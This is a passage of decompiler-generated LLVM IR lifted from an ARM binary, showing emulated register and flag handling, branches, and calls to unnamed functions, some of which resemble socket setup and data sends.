  %v1_11640 = add i32 %v3_11638, -1
  store i32 %v1_11640, i32* %r3.global-to-local, align 4
  %v0_11644 = load i32, i32* @r6, align 4
  %v1_11644 = add i32 %v0_11644, 24
  %v2_11644 = inttoptr i32 %v1_11644 to i32*
  %v3_11644 = load i32, i32* %v2_11644, align 4
  store i32 %v3_11644, i32* %r1.global-to-local, align 4
  %v0_11648 = load i32, i32* @fp, align 4
  store i32 %v0_11648, i32* %r0.global-to-local, align 4
  %v4_1164c = call i32 @function_123dc(i32 %v0_11648, i32 %v3_11644, i32 %v3_11634, i32 %v1_11640)
  store i32 %v4_1164c, i32* @r7, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_11658 = call i32 @function_119f4(i32 25)
  store i32 %v1_11658, i32* %r0.global-to-local, align 4
  %v0_1165c = load i32, i32* @r7, align 4
  %v2_1165c = icmp eq i32 %v0_1165c, -1
  store i1 %v2_1165c, i1* %cpsr_c.global-to-local, align 1
  %v7_1165c = icmp eq i32 %v0_1165c, -1
  store i1 %v7_1165c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1165c, label %dec_label_pc_10c18.loopexit, label %dec_label_pc_11664

dec_label_pc_11664:                               ; preds = %dec_label_pc_11618
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11664 = icmp eq i32 %v0_1165c, 0
  store i1 %v2_11664, i1* %cpsr_z.global-to-local, align 1
  %tmp376 = icmp slt i32 %v0_1165c, 1
  br i1 %tmp376, label %dec_label_pc_113bc, label %dec_label_pc_1166c

dec_label_pc_1166c:                               ; preds = %dec_label_pc_11664
  %v0_1166c = load i32, i32* @r6, align 4
  %v1_1166c = add i32 %v0_1166c, 20
  %v2_1166c = inttoptr i32 %v1_1166c to i16*
  %v3_1166c = load i16, i16* %v2_1166c, align 2
  %v4_1166c = zext i16 %v3_1166c to i32
  store i32 %v4_1166c, i32* %r3.global-to-local, align 4
  %v1_11670 = add i32 %v0_1166c, 16
  %v2_11670 = inttoptr i32 %v1_11670 to i32*
  %v3_11670 = load i32, i32* %v2_11670, align 4
  store i32 %v3_11670, i32* %r2.global-to-local, align 4
  store i32 %v2_11674, i32* %ip.global-to-local, align 4
  store i32 %v4_1166c, i32* %stack_var_-42, align 4
  store i32 %v3_11670, i32* %stack_var_-60, align 4
  %v1_11680 = inttoptr i32 %v0_1166c to i32*
  %v2_11680 = load i32, i32* %v1_11680, align 4
  store i32 %v2_11680, i32* @sb, align 4
  %v0_11684 = call i32 @function_14c4c()
  store i32 %v0_11684, i32* %r0.global-to-local, align 4
  %v7_11688 = icmp eq i32 %v0_11684, -1
  %.387 = zext i1 %v7_11688 to i32
  store i32 %.387, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11694 = icmp eq i32 %v0_11684, 0
  store i1 %v2_11694, i1* %cpsr_z.global-to-local, align 1
  %tmp379 = icmp slt i32 %v0_11684, 1
  br i1 %tmp379, label %bb380, label %.thread103

.thread103:                                       ; preds = %dec_label_pc_1166c
  store i32 1, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_116ec

bb380:                                            ; preds = %dec_label_pc_1166c
  store i32 %.387, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_116a0 = icmp eq i1 %v7_11688, false
  store i1 %v2_116a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_116a0, label %dec_label_pc_116a8, label %dec_label_pc_116ec

dec_label_pc_116a8:                               ; preds = %bb380
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_116b4 = call i32 @function_14b54(i32 2, i32 1, i32 0)
  store i32 %v3_116b4, i32* %r0.global-to-local, align 4
  %v2_116b8 = icmp eq i32 %v3_116b4, -1
  store i1 %v2_116b8, i1* %cpsr_c.global-to-local, align 1
  %v7_116b8 = icmp eq i32 %v3_116b4, -1
  store i1 %v7_116b8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_116b4, i32* @r8, align 4
  br i1 %v7_116b8, label %dec_label_pc_11974, label %dec_label_pc_116c4

dec_label_pc_116c4:                               ; preds = %dec_label_pc_116a8
  store i32 18, i32* %r0.global-to-local, align 4
  %v1_116c8 = call i32 @function_11a94(i32 18)
  store i32 19, i32* %r0.global-to-local, align 4
  %v1_116d0 = call i32 @function_11a94(i32 19)
  %v0_116d4 = load i32, i32* @sl, align 4
  store i32 %v0_116d4, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r0.global-to-local, align 4
  %v2_116dc = inttoptr i32 %v0_116d4 to i32*
  %v3_116dc = call i32 @function_119d0(i32 18, i32* %v2_116dc)
  store i32 %v3_116dc, i32* %r0.global-to-local, align 4
  %v1_116e0 = call i32 @function_f874(i32 %v3_116dc)
  store i32 %v1_116e0, i32* %r0.global-to-local, align 4
  store i32 %v1_116e0, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_116e4 = icmp eq i32 %v1_116e0, 0
  store i1 %v3_116e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_116e4, label %dec_label_pc_116ec, label %dec_label_pc_11854

dec_label_pc_116ec:                               ; preds = %.thread103, %dec_label_pc_116c4, %bb380
  %v0_116ec = load i32, i32* @r6, align 4
  %v1_116ec = add i32 %v0_116ec, 4
  %v2_116ec = inttoptr i32 %v1_116ec to i32*
  %v3_116ec = load i32, i32* %v2_116ec, align 4
  store i32 %v3_116ec, i32* @r0, align 4
  %v1_116f0 = call i32 @function_15b20(i32 %v3_116ec)
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_116fc = load i32, i32* @r6, align 4
  %v2_116fc = add i32 %v1_116fc, 4
  %v3_116fc = inttoptr i32 %v2_116fc to i32*
  store i32 -1, i32* %v3_116fc, align 4
  %v0_11700 = load i32, i32* %r0.global-to-local, align 4
  %v1_11700 = load i32, i32* @r6, align 4
  %v2_11700 = add i32 %v1_11700, 12
  %v3_11700 = inttoptr i32 %v2_11700 to i32*
  store i32 %v0_11700, i32* %v3_11700, align 4
  br label %dec_label_pc_113bc

dec_label_pc_11708:                               ; preds = %dec_label_pc_10c34
  br i1 %v2_10c5c, label %dec_label_pc_10cd4, label %dec_label_pc_1170c

dec_label_pc_1170c:                               ; preds = %dec_label_pc_11708
  %v3_1170c = icmp eq i32 %v4_10c58, -1
  store i1 %v3_1170c, i1* %cpsr_c.global-to-local, align 1
  %v8_1170c = icmp eq i32 %v4_10c58, -1
  store i1 %v8_1170c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1170c, label %dec_label_pc_10ce0, label %dec_label_pc_10c84

dec_label_pc_11718:                               ; preds = %dec_label_pc_10c24
  store i32 %.pre, i32* %r0.global-to-local, align 4
  %v1_11720 = add i32 %v0_11718, 92
  store i32 %v1_11720, i32* %r1.global-to-local, align 4
  store i32 192, i32* %r2.global-to-local, align 4
  %v3_11728 = inttoptr i32 %.pre to i8*
  %v4_11728 = call i32 @function_153fc(i8* %v3_11728, i32 %v1_11720, i32 192)
  store i32 %v4_11728, i32* %r0.global-to-local, align 4
  %v0_1172c = load i32, i32* @r6, align 4
  %v1_1172c = add i32 %v0_1172c, 24
  %v2_1172c = inttoptr i32 %v1_1172c to i32*
  %v3_1172c = load i32, i32* %v2_1172c, align 4
  %v1_11730 = add i32 %v3_1172c, -64
  store i32 %v1_11730, i32* %r3.global-to-local, align 4
  store i32 %v1_11730, i32* %v2_1172c, align 4
  br label %dec_label_pc_10c34

dec_label_pc_1173c:                               ; preds = %dec_label_pc_11570
  store i32 %v2_11530, i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_11748 = add i32 %v0_1155c, 4
  %v2_11748 = inttoptr i32 %v1_11748 to i32*
  %v3_11748 = load i32, i32* %v2_11748, align 4
  store i32 %v3_11748, i32* @r0, align 4
  %v4_1174c = call i32 @function_14a74(i32 %v3_11748, i32 %v2_11530, i32 3, i32 16384)
  store i32 %v4_1174c, i32* %r0.global-to-local, align 4
  %v0_11750 = load i32, i32* @r6, align 4
  %v1_11750 = add i32 %v0_11750, 4
  %v2_11750 = inttoptr i32 %v1_11750 to i32*
  %v3_11750 = load i32, i32* %v2_11750, align 4
  store i32 %v3_11750, i32* @r0, align 4
  br label %dec_label_pc_11500

dec_label_pc_11760:                               ; preds = %dec_label_pc_10d8c
  %v0_11760 = load i32, i32* @r6, align 4
  store i32 %v0_11760, i32* @r0, align 4
  %v0_11764 = call i32 @function_fdc0()
  store i32 %v0_11764, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10dc8

dec_label_pc_1176c:                               ; preds = %dec_label_pc_10bdc
  store i32 4, i32* @r2, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_118dc, i32* %r3.global-to-local, align 4
  store i32 %v2_112d4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v5_11794 = call i32 @function_14804(i32 %v3_10bd0, i32 1, i32 4, i32 %v2_118dc, i32 %v2_112d4)
  %v3_11798 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11798, i32* %r3.global-to-local, align 4
  %v2_1179c = or i32 %v3_11798, %v5_11794
  store i32 %v2_1179c, i32* %r0.global-to-local, align 4
  %v4_1179c = icmp eq i32 %v2_1179c, 0
  store i1 %v4_1179c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_1179c, label %dec_label_pc_117a4, label %dec_label_pc_11838

dec_label_pc_117a4:                               ; preds = %dec_label_pc_1176c
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_117a8 = load i32, i32* @r6, align 4
  %v2_117a8 = add i32 %v1_117a8, 12
  %v3_117a8 = inttoptr i32 %v2_117a8 to i32*
  store i32 2, i32* %v3_117a8, align 4
  %v0_117ac = call i32 @function_f570()
  store i32 %v0_117ac, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i16** @global_var_22394.200 to i32), i32* %r3.global-to-local, align 4
  %v2_117b4 = load i16, i16* bitcast (i16** @global_var_22394.200 to i16*), align 4
  %v3_117b4 = zext i16 %v2_117b4 to i32
  store i32 %v3_117b4, i32* %r1.global-to-local, align 4
  %v3_117b8 = call i32 @function_12a1c(i32 %v0_117ac, i32 %v3_117b4)
  store i32 %v3_117b8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22364.196 to i32), i32* %r3.global-to-local, align 4
  %v2_117c0 = load i32, i32* @global_var_22364.196, align 4
  store i32 %v2_117c0, i32* %ip.global-to-local, align 4
  %v1_117c8 = load i32, i32* @r4, align 4
  %v9_117c8 = icmp eq i32 %v2_117c0, %v1_117c8
  store i1 %v9_117c8, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_117b4, i32* %r1.global-to-local, align 4
  %v7_117d0 = icmp sgt i32 %v2_117c0, %v1_117c8
  br i1 %v7_117d0, label %dec_label_pc_117d4, label %dec_label_pc_11814

dec_label_pc_117d4:                               ; preds = %dec_label_pc_117a4
  %v2_117d8 = load i32, i32* @global_var_22390.198, align 4
  store i32 %v2_117d8, i32* %r3.global-to-local, align 4
  store i32 %v1_117c8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_117f4

dec_label_pc_117e4:                               ; preds = %dec_label_pc_11804, %dec_label_pc_117f4
  %v1_117e4 = add i32 %v0_117e4, 1
  store i32 %v1_117e4, i32* %r2.global-to-local, align 4
  %v9_117e8 = icmp eq i32 %v1_117e4, %v2_117c0
  %v1_117ec = add i32 %v0_117ec, 16
  store i32 %v1_117ec, i32* %r3.global-to-local, align 4
  br i1 %v9_117e8, label %dec_label_pc_11814.loopexit, label %dec_label_pc_117f4

dec_label_pc_117f4:                               ; preds = %dec_label_pc_117e4, %dec_label_pc_117d4
  %v0_117e4 = phi i32 [ %v1_117e4, %dec_label_pc_117e4 ], [ %v1_117c8, %dec_label_pc_117d4 ]
  %v0_117ec = phi i32 [ %v1_117ec, %dec_label_pc_117e4 ], [ %v2_117d8, %dec_label_pc_117d4 ]
  store i32 %v0_117ec, i32* %r0.global-to-local, align 4
  %v1_117f8 = add i32 %v0_117ec, 8
  %v2_117f8 = inttoptr i32 %v1_117f8 to i16*
  %v3_117f8 = load i16, i16* %v2_117f8, align 2
  %v4_117f8 = zext i16 %v3_117f8 to i32
  store i32 %v4_117f8, i32* %r3.global-to-local, align 4
  %tmp381 = icmp ugt i16 %v3_117f8, %v2_117b4
  br i1 %tmp381, label %dec_label_pc_117e4, label %dec_label_pc_11804

dec_label_pc_11804:                               ; preds = %dec_label_pc_117f4
  %v1_11804 = add i32 %v0_117ec, 10
  %v2_11804 = inttoptr i32 %v1_11804 to i16*
  %v3_11804 = load i16, i16* %v2_11804, align 2
  %v4_11804 = zext i16 %v3_11804 to i32
  store i32 %v4_11804, i32* %r3.global-to-local, align 4
  %v3_11808 = icmp uge i16 %v3_11804, %v2_117b4
  %v9_11808 = icmp eq i16 %v3_11804, %v2_117b4
  %v2_1180c = xor i1 %v3_11808, true
  %v3_1180c = or i1 %v9_11808, %v2_1180c
  br i1 %v3_1180c, label %dec_label_pc_117e4, label %dec_label_pc_11818.loopexit

dec_label_pc_11814.loopexit:                      ; preds = %dec_label_pc_117e4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11814

dec_label_pc_11814:                               ; preds = %dec_label_pc_11814.loopexit, %dec_label_pc_117a4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11818

dec_label_pc_11818.loopexit:                      ; preds = %dec_label_pc_11804
  store i1 %v3_11808, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11818

dec_label_pc_11818:                               ; preds = %dec_label_pc_11818.loopexit, %dec_label_pc_11814
  %v0_1182c = phi i32 [ %v0_117ec, %dec_label_pc_11818.loopexit ], [ 0, %dec_label_pc_11814 ]
  %v0_11818 = load i32, i32* @r6, align 4
  %v1_11818 = add i32 %v0_11818, 4
  %v2_11818 = inttoptr i32 %v1_11818 to i32*
  %v3_11818 = load i32, i32* %v2_11818, align 4
  %v3_1181c = udiv i32 %v3_11818, 32
  store i32 %v3_1181c, i32* %r2.global-to-local, align 4
  %v1_11820 = urem i32 %v3_11818, 32
  store i32 %v1_11820, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_11824 = mul nuw nsw i32 %v3_1181c, 4
  store i32 %v3_11824, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1182c = inttoptr i32 %v0_11818 to i32*
  store i32 %v0_1182c, i32* %v2_1182c, align 4
  %v0_11830 = load i32, i32* %r3.global-to-local, align 4
  %v1_11830 = load i32, i32* @r6, align 4
  %v2_11830 = add i32 %v1_11830, 24
  %v3_11830 = inttoptr i32 %v2_11830 to i32*
  store i32 %v0_11830, i32* %v3_11830, align 4
  %v0_10c04.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_10c0c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10c00

dec_label_pc_11838:                               ; preds = %dec_label_pc_1176c
  %v0_11838 = load i32, i32* @r6, align 4
  %v1_11838 = add i32 %v0_11838, 4
  %v2_11838 = inttoptr i32 %v1_11838 to i32*
  %v3_11838 = load i32, i32* %v2_11838, align 4
  store i32 %v3_11838, i32* @r0, align 4
  %v1_1183c = call i32 @function_15b20(i32 %v3_11838)
  store i32 %v1_1183c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_11844 = load i32, i32* @r4, align 4
  %v1_11844 = load i32, i32* @r6, align 4
  %v2_11844 = add i32 %v1_11844, 12
  %v3_11844 = inttoptr i32 %v2_11844 to i32*
  store i32 %v0_11844, i32* %v3_11844, align 4
  %v0_11848 = load i32, i32* %r3.global-to-local, align 4
  %v1_11848 = load i32, i32* @r6, align 4
  %v2_11848 = add i32 %v1_11848, 4
  %v3_11848 = inttoptr i32 %v2_11848 to i32*
  store i32 %v0_11848, i32* %v3_11848, align 4
  %v0_1184c = load i32, i32* @r4, align 4
  %v1_1184c = trunc i32 %v0_1184c to i8
  %v2_1184c = load i32, i32* @r6, align 4
  %v3_1184c = add i32 %v2_1184c, 284
  %v4_1184c = inttoptr i32 %v3_1184c to i8*
  store i8 %v1_1184c, i8* %v4_1184c, align 1
  br label %dec_label_pc_10d3c

dec_label_pc_11854:                               ; preds = %dec_label_pc_116c4
  store i32 %v2_11674, i32* @lr, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v1_11860 = add i32 %v1_116e0, 4
  %v2_11860 = inttoptr i32 %v1_11860 to i32*
  %v3_11860 = load i32, i32* %v2_11860, align 4
  store i32 %v3_11860, i32* @r4, align 4
  %v0_11864 = call i32 @function_f570()
  store i32 %v0_11864, i32* %r0.global-to-local, align 4
  %v0_11868 = load i32, i32* @r5, align 4
  %v1_11868 = inttoptr i32 %v0_11868 to i8*
  %v2_11868 = load i8, i8* %v1_11868, align 1
  %v3_11868 = zext i8 %v2_11868 to i32
  store i32 %v3_11868, i32* %r1.global-to-local, align 4
  %v2_1186c = call i32 @function_12a1c(i32 %v0_11864, i32 %v3_11868)
  store i32 %v2_1186c, i32* %r0.global-to-local, align 4
  %v0_11870 = load i32, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_11870 = mul nuw nsw i32 %v3_11868, 4
  %v5_11870 = add i32 %v0_11870, %v4_11870
  %v6_11870 = inttoptr i32 %v5_11870 to i32*
  %v7_11870 = load i32, i32* %v6_11870, align 4
  store i32 %v7_11870, i32* %r3.global-to-local, align 4
  store i32 19, i32* %r0.global-to-local, align 4
  %v0_11878 = load i32, i32* @sl, align 4
  store i32 %v0_11878, i32* %r1.global-to-local, align 4
  %v2_11880 = inttoptr i32 %v0_11878 to i32*
  %v3_11880 = call i32 @function_119d0(i32 19, i32* %v2_11880)
  store i32 %v2_11674, i32* %r1.global-to-local, align 4
  %v0_11890 = load i32, i32* @r5, align 4
  store i32 %v0_11890, i32* %r0.global-to-local, align 4
  %v1_11894 = call i32 @function_f84c(i32 %v0_11890)
  store i32 18, i32* %r0.global-to-local, align 4
  %v1_1189c = call i32 @function_119f4(i32 18)
  store i32 19, i32* %r0.global-to-local, align 4
  %v1_118a4 = call i32 @function_119f4(i32 19)
  %v0_118ac = load i32, i32* @r8, align 4
  store i32 %v0_118ac, i32* %r0.global-to-local, align 4
  store i32 %v2_118b0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_118b8 = call i32 @function_14798(i32 %v0_118ac, i32 %v2_118b0, i32 16)
  store i32 %v3_118b8, i32* %r0.global-to-local, align 4
  %v3_118bc = icmp eq i32 %v3_118b8, -1
  store i1 %v3_118bc, i1* %cpsr_c.global-to-local, align 1
  %v8_118bc = icmp eq i32 %v3_118b8, -1
  store i1 %v8_118bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_118bc, label %dec_label_pc_118c4, label %dec_label_pc_118d4

dec_label_pc_118c4:                               ; preds = %dec_label_pc_11854
  %v0_118c4 = load i32, i32* @r8, align 4
  store i32 %v0_118c4, i32* @r0, align 4
  %v1_118c8 = call i32 @function_15b20(i32 %v0_118c4)
  %v0_118cc = load i32, i32* @sl, align 4
  store i32 %v0_118cc, i32* %r0.global-to-local, align 4
  %v1_118d0 = call i32 @function_12ee4(i32 %v0_118cc)
  store i32 %v1_118d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_118d4

dec_label_pc_118d4:                               ; preds = %dec_label_pc_11854, %dec_label_pc_118c4
  store i32 1, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_118dc, i32* @r1, align 4
  %v0_118e0 = load i32, i32* @r8, align 4
  store i32 %v0_118e0, i32* @r0, align 4
  %v0_118e4 = load i32, i32* @sl, align 4
  store i32 %v0_118e4, i32* %stack_var_-56, align 4
  %v5_118e8 = call i32 @function_14a74(i32 %v0_118e0, i32 %v2_118dc, i32 1, i32 16384)
  store i32 %v2_112d4, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_118fc = load i32, i32* @r8, align 4
  store i32 %v0_118fc, i32* @r0, align 4
  %v4_11900 = call i32 @function_14a74(i32 %v0_118fc, i32 %v2_112d4, i32 4, i32 16384)
  store i32 %v2_11908, i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11914 = load i32, i32* @r8, align 4
  store i32 %v0_11914, i32* @r0, align 4
  %v4_11918 = call i32 @function_14a74(i32 %v0_11914, i32 %v2_11908, i32 2, i32 16384)
  %v0_1191c = load i32, i32* @sb, align 4
  %v1_1191c = add i32 %v0_1191c, 12
  store i32 %v1_1191c, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11928 = load i32, i32* @r8, align 4
  store i32 %v0_11928, i32* @r0, align 4
  %v4_1192c = call i32 @function_14a74(i32 %v0_11928, i32 %v1_1191c, i32 1, i32 16384)
  store i32 %v4_1192c, i32* %r0.global-to-local, align 4
  %v0_11930 = load i32, i32* @sb, align 4
  %v1_11930 = inttoptr i32 %v0_11930 to i32*
  %v2_11930 = load i32, i32* %v1_11930, align 4
  store i32 %v2_11930, i32* @r1, align 4
  %v1_11934 = add i32 %v0_11930, 12
  %v2_11934 = inttoptr i32 %v1_11934 to i8*
  %v3_11934 = load i8, i8* %v2_11934, align 1
  %v4_11934 = zext i8 %v3_11934 to i32
  store i32 %v4_11934, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1193c = load i32, i32* @r8, align 4
  store i32 %v0_1193c, i32* @r0, align 4
  %v4_11940 = call i32 @function_14a74(i32 %v0_1193c, i32 %v2_11930, i32 %v4_11934, i32 16384)
  %v0_11944 = load i32, i32* @sb, align 4
  %v1_11944 = add i32 %v0_11944, 13
  store i32 %v1_11944, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11950 = load i32, i32* @r8, align 4
  store i32 %v0_11950, i32* @r0, align 4
  %v4_11954 = call i32 @function_14a74(i32 %v0_11950, i32 %v1_11944, i32 1, i32 16384)
  %v0_11958 = load i32, i32* @r8, align 4
  store i32 %v0_11958, i32* @r0, align 4
  %v0_1195c = load i32, i32* @sb, align 4
  %v1_1195c = add i32 %v0_1195c, 13
  %v2_1195c = inttoptr i32 %v1_1195c to i8*
  %v3_1195c = load i8, i8* %v2_1195c, align 1
  %v4_1195c = zext i8 %v3_1195c to i32
  store i32 %v4_1195c, i32* @r2, align 4
  %v1_11960 = add i32 %v0_1195c, 4
  %v2_11960 = inttoptr i32 %v1_11960 to i32*
  %v3_11960 = load i32, i32* %v2_11960, align 4
  store i32 %v3_11960, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11968 = call i32 @function_14a74(i32 %v0_11958, i32 %v3_11960, i32 %v4_1195c, i32 16384)
  %v0_1196c = load i32, i32* @r8, align 4
  store i32 %v0_1196c, i32* @r0, align 4
  %v1_11970 = call i32 @function_15b20(i32 %v0_1196c)
  store i32 %v1_11970, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11974

dec_label_pc_11974:                               ; preds = %dec_label_pc_116a8, %dec_label_pc_118d4
  %v0_11974 = load i32, i32* @sl, align 4
  store i32 %v0_11974, i32* %r0.global-to-local, align 4
  %v1_11978 = call i32 @function_12ee4(i32 %v0_11974)
  store i32 %v1_11978, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1197c

dec_label_pc_1197c:                               ; preds = %dec_label_pc_11398, %dec_label_pc_11974
  %v0_1197c = load i32, i32* @fp, align 4
  store i32 %v0_1197c, i32* %r0.global-to-local, align 4
  %v0_11980 = load i32, i32* @r6, align 4
  %v1_11980 = add i32 %v0_11980, 24
  %v2_11980 = inttoptr i32 %v1_11980 to i32*
  %v3_11980 = load i32, i32* %v2_11980, align 4
  store i32 %v3_11980, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19a0c.337 to i32), i32* %r2.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v5_1198c = call i32 @function_123dc(i32 %v0_1197c, i32 %v3_11980, i32 ptrtoint ([6 x i8]* @global_var_19a0c.337 to i32), i32 5)
  store i32 %v5_1198c, i32* %r0.global-to-local, align 4
  %v3_11990 = icmp eq i32 %v5_1198c, -1
  store i1 %v3_11990, i1* %cpsr_c.global-to-local, align 1
  %v8_11990 = icmp eq i32 %v5_1198c, -1
  store i1 %v8_11990, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_1198c, i32* @r7, align 4
  br i1 %v3_11990, label %dec_label_pc_10c18.loopexit, label %dec_label_pc_113b4

dec_label_pc_119a0:                               ; preds = %dec_label_pc_10a60
  store i32 %v3_119a0, i32* %r0.global-to-local, align 4
  %v3_119a4 = udiv i32 %v3_119a0, 32
  %v3_119a8 = mul nuw nsw i32 %v3_119a4, 4
  store i32 %v2_119ac, i32* @lr, align 4
  %v2_119b0 = add i32 %v3_119a8, %v2_119ac
  store i32 %v2_119b0, i32* %r3.global-to-local, align 4
  %v1_119b4 = add i32 %v2_119b0, -312
  %v2_119b4 = inttoptr i32 %v1_119b4 to i32*
  %v3_119b4 = load i32, i32* %v2_119b4, align 4
  %v1_119b8 = urem i32 %v3_119a0, 32
  store i32 %v1_119b8, i32* %r1.global-to-local, align 4
  %v7_119bc = shl i32 1, %v1_119b8
  %v8_119bc = or i32 %v3_119b4, %v7_119bc
  store i32 %v8_119bc, i32* %r2.global-to-local, align 4
  %v1_119c0 = load i32, i32* @r5, align 4
  %v3_119c0 = icmp uge i32 %v3_119a0, %v1_119c0
  store i1 %v3_119c0, i1* %cpsr_c.global-to-local, align 1
  %v9_119c0 = icmp eq i32 %v3_119a0, %v1_119c0
  store i1 %v9_119c0, i1* %cpsr_z.global-to-local, align 1
  %v7_119c4 = icmp sgt i32 %v3_119a0, %v1_119c0
  br i1 %v7_119c4, label %bb382, label %bb383

bb382:                                            ; preds = %dec_label_pc_119a0
  store i32 %v3_119a0, i32* @r5, align 4
  br label %bb383

bb383:                                            ; preds = %dec_label_pc_119a0, %bb382
  store i32 %v8_119bc, i32* %v2_119b4, align 4
  br label %bb334

; uselistorder directives
  uselistorder i32 %v1_119c0, { 0, 2, 1 }
  uselistorder i32 %v1_119b8, { 1, 0 }
  uselistorder i32 %v5_1198c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_11818, { 1, 0 }
  uselistorder i1 %v3_11808, { 1, 0 }
  uselistorder i32 %v0_117ec, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_117c0, { 0, 2, 1, 3 }
  uselistorder i32 %v3_11750, { 1, 0 }
  uselistorder i1 %v7_116b8, { 1, 0 }
  uselistorder i32 %v3_116b4, { 1, 0, 2, 3 }
  uselistorder i1 %v2_116a0, { 1, 0 }
  uselistorder i32 %.387, { 1, 0 }
  uselistorder i1 %v7_11688, { 1, 0 }
  uselistorder i32 %v0_11684, { 2, 1, 0, 3 }
  uselistorder i1 %v7_1165c, { 1, 0 }
  uselistorder i32 %v0_1165c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_115e0, { 1, 0 }
  uselistorder i32 %v0_115a4, { 1, 0 }
  uselistorder i32 %v0_11590.pr, { 1, 0 }
  uselistorder i32 %v0_1155c, { 1, 2, 0 }
  uselistorder i32 %v0_1151c, { 1, 0 }
  uselistorder i32 %v1_11514, { 1, 0 }
  uselistorder i32 %v1_1150c, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_11508, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_11508, { 0, 2, 1 }
  uselistorder i32 %v0_114e8.pr, { 1, 0 }
  uselistorder i32 %v0_114c8.pr, { 1, 0 }
  uselistorder i1 %v7_114a0, { 1, 0 }
  uselistorder i1 %v2_11490, { 1, 0, 2 }
  uselistorder i1 %v2_11474, { 1, 0, 2 }
  uselistorder i32 %v1_11494, { 1, 2, 3, 0 }
  uselistorder i32 %v0_11468, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_11498, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v3_1145c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_11444, { 1, 0 }
  uselistorder i32 %v5_11440, { 2, 3, 1, 0, 4, 5 }
  uselistorder i32 %v1_1142c, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_1142c, { 0, 2, 1 }
  uselistorder i32 %v0_11424, { 1, 0 }
  uselistorder i1 %v7_11420, { 1, 0 }
  uselistorder i1 %v7_11418, { 1, 0 }
  uselistorder i1 %v8_11410, { 1, 0 }
  uselistorder i1 %v7_113f4, { 1, 0 }
  uselistorder i1 %v7_113ec, { 1, 0 }
  uselistorder i1 %v8_113e4, { 1, 0 }
  uselistorder i32 %v1_113cc, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i32 %v3_113c8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_113b4, { 1, 0 }
